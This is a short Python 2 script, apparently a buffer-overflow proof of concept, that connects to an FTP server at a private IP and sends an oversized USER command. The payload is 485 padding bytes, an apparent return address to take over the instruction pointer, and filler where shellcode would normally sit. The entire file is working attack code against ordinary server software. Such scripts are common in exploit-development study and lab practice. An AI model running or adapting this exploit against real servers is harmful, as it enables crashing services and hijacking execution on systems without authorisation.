#!/usr/bin/python
import socket
#77c11169
buffer = "A" * 485 + "\x69\x11\xc1\x77" + "C" * 4 + "D" * 607
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.128',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()
